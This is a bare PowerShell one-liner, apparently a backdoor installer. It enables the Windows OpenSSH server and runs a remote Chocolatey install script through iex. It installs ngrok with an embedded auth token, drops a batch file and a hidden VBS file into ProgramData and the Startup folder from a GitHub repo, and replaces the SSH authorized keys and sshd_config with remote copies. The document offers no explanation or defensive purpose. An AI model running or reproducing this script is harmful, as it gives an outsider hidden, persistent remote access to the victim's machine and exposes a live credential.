Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'; Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install ngrok -y; ngrok config add-authtoken 2Zm58ahROcrPwJl32wKOlvBF26L_25CJ2HEkvkph2QBHLXitV; Restart-Service sshd; cd "C:\ProgramData";Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/NETFLIX/main/google.bat; cd "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; Start-BitsTransfer "https://raw.githubusercontent.com/2o2ks/NETFLIX/main/startup.vbs"; Set-ItemProperty -Path $path -Name Attributes -Value ([IO.FileAttributes]::Hidden); $path = "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs"; cd C:\ProgramData\ssh ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/administrators_authorized_keys } ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/sshd_config }
;
